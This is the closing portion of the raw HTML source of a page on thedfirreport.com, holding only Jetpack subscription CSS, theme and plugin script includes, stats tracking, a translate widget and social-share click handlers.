.wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.6.2" id="freenews-navigation-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.6.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.6.2" id="ResizeSensor-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.6.2" id="theia-sticky-sidebar-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.6.2" id="slick-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.6.2" id="freenews-slick-settings-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.6.2" id="jquery-sticky-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.6.2" id="freenews-sticky-settings-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.6.2" id="marquee-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.6.2" id="freenews-marquee-settings-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"37127\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "37127" ]);
/* ]]> */
</script>
<script type="6a763440a26db97cfd8463be-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=13.9.1" id="google-translate-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=13.9.1" id="jetpack-block-subscriptions-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="6a763440a26db97cfd8463be-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="6a763440a26db97cfd8463be-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>

<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="6a763440a26db97cfd8463be-|49" defer></script></body>
</html>
